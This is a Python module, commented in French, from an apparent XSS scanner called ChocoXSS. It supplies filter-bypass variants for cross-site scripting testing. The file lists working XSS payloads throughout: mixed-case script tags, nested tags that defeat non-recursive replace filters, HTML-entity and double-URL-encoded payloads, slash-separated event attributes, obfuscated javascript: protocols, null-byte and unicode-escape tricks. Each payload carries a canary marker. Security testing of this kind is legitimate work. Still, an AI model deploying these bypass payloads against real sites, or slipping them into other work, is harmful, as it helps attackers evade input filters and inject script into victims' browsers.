"""
ChocoXSS — Variantes de contournement de filtrage
=====================================================

Complète payload_engine.py : les payloads standards suffisent contre une
cible qui échappe ou n'échappe pas du tout, mais échouent contre un
filtrage actif naïf (ex: un simple .replace("<script>", "") côté serveur,
comme observé sur le paramètre redirect_to de WordPress — cf. session
CTF MakeSense HTB).

Ce module ne remplace pas payload_engine.py — il fournit des VARIANTES
de contournement, déclenchées uniquement quand un payload standard revient
REFLECTED_PARTIAL (preuve qu'un filtre actif existe et mérite d'être
titillé). Les envoyer systématiquement dès le premier scan multiplierait
le nombre de requêtes par ~8 pour un gain nul sur les cibles qui
échappent/n'échappent pas simplement.

Chaque variante cible une classe précise de filtre naïf :

  - Casse mixte              : filtre sensible à la casse sur "<script>"
  - Tag imbriqué             : filtre .replace() non récursif — la
                                suppression d'une seule occurrence de
                                "<script>" laisse une balise valide
  - Entités HTML numériques  : filtre qui vérifie les caractères littéraux
                                mais pas leur forme encodée en entités
  - Double encodage URL      : filtre qui décode une fois puis vérifie,
                                alors que le serveur décode deux fois
  - Attribut sans espace     : filtre qui exige un espace avant l'attribut
                                d'événement (onerror, onload...)
  - Casse mixte du protocole : filtre sur "javascript:" en minuscules strict
"""

from __future__ import annotations

from dataclasses import dataclass
from enum import Enum

from modules.active.payload_engine import PayloadContext


class BypassTechnique(Enum):
    MIXED_CASE       = "mixed_case"
    NESTED_TAG       = "nested_tag"
    HTML_ENTITY      = "html_entity"
    DOUBLE_URL_ENC   = "double_url_encoding"
    NO_WHITESPACE    = "no_whitespace_attribute"
    MIXED_CASE_PROTO = "mixed_case_protocol"
    NULL_BYTE        = "null_byte_injection"
    CONCAT_STRING    = "js_string_concatenation"


@dataclass
class BypassPayload:
    context: PayloadContext
    technique: BypassTechnique
    template: str          # contient {marker}
    description: str       # explique le filtre naïf ciblé, pour le rapport


BYPASS_TEMPLATES: list[BypassPayload] = [

    # ── Casse mixte — filtre sensible à la casse sur "<script>" ────────────────
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.MIXED_CASE,
        "<ScRiPt>alert('{marker}')</sCrIpT>",
        "Contourne un filtre qui bloque uniquement '<script>' en minuscules strict",
    ),
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.MIXED_CASE,
        "<IMG SRC=x OnErRoR=\"alert('{marker}')\">",
        "Variante casse mixte sur balise + attribut événement",
    ),

    # ── Tag imbriqué — filtre .replace() non récursif (un seul passage) ────────
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.NESTED_TAG,
        "<scr<script>ipt>alert('{marker}')</scr</script>ipt>",
        "Si le filtre supprime '<script>' en un seul passage sans boucler, "
        "la suppression laisse échapper une balise <script> valide reconstituée",
    ),
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.NESTED_TAG,
        "<img sr<script>c=x oner<script>ror=\"alert('{marker}')\">",
        "Même principe appliqué à un filtre qui cible spécifiquement <script> "
        "en laissant passer <img>",
    ),

    # ── Entités HTML numériques — filtre sur caractères littéraux uniquement ───
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.HTML_ENTITY,
        "&#60;script&#62;alert('{marker}')&#60;/script&#62;",
        "Contourne un filtre qui cherche le caractère '<' littéral mais pas "
        "sa forme encodée en entité HTML numérique — ne s'exécute que si le "
        "backend décode les entités avant stockage/affichage",
    ),

    # ── Double encodage URL — filtre qui décode une seule fois ─────────────────
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.DOUBLE_URL_ENC,
        "%253Cscript%253Ealert('{marker}')%253C/script%253E",
        "Contourne un filtre qui décode l'URL une fois puis vérifie, alors "
        "que le serveur web décode deux fois (WAF/reverse-proxy fréquent)",
    ),

    # ── Attribut sans espace — filtre exigeant un espace avant l'événement ─────
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.NO_WHITESPACE,
        "<svg/onload=alert('{marker}')>",
        "Slash au lieu d'espace avant l'attribut — contourne un filtre "
        "qui cherche spécifiquement ' onload=' ou ' onerror=' avec espace",
    ),
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.NO_WHITESPACE,
        "<img/src=x/onerror=alert('{marker}')>",
        "Variante avec slashes multiples entre attributs",
    ),

    # ── Casse mixte du protocole javascript: ────────────────────────────────────
    BypassPayload(
        PayloadContext.URL_CONTEXT, BypassTechnique.MIXED_CASE_PROTO,
        "JaVaScRiPt:alert('{marker}')",
        "Contourne un filtre qui bloque 'javascript:' en minuscules strict",
    ),
    BypassPayload(
        PayloadContext.URL_CONTEXT, BypassTechnique.MIXED_CASE_PROTO,
        "java\tscript:alert('{marker}')",
        "Tabulation insérée dans le mot 'javascript' — certains navigateurs "
        "ignorent les caractères de contrôle dans le nom du protocole",
    ),

    # ── Injection de null byte — filtre qui tronque son traitement sur \\0 ──────
    BypassPayload(
        PayloadContext.HTML_BODY, BypassTechnique.NULL_BYTE,
        "<script>alert('{marker}')</script>\x00",
        "Certains filtres écrits en C/anciens langages tronquent leur analyse "
        "au premier octet nul sans que le navigateur ne s'arrête pareillement",
    ),

    # ── Concaténation JS — filtre qui cherche la chaîne 'alert(' complète ───────
    BypassPayload(
        PayloadContext.JS_STRING, BypassTechnique.CONCAT_STRING,
        "';al\\u0065rt('{marker}');'",
        "Échappement Unicode dans le nom de fonction — contourne un filtre "
        "qui cherche littéralement la sous-chaîne 'alert('",
    ),
]


def build_bypass_payloads(marker: str, context: PayloadContext | None = None) -> list[tuple[str, BypassTechnique, PayloadContext, str]]:
    """
    Instancie les templates de contournement avec le marqueur donné.

    Args:
        marker: token canari unique pour ce scan
        context: si fourni, ne retourne que les variantes ciblant ce
            contexte précis (typiquement celui du payload standard qui
            a été partiellement filtré — pas la peine de tester une
            variante URL_CONTEXT si le filtrage a été observé en HTML_BODY)

    Returns:
        Liste de tuples (payload_final, technique, contexte, description)
    """
    templates = BYPASS_TEMPLATES if context is None else [
        t for t in BYPASS_TEMPLATES if t.context == context
    ]
    return [
        (t.template.format(marker=marker), t.technique, t.context, t.description)
        for t in templates
    ]
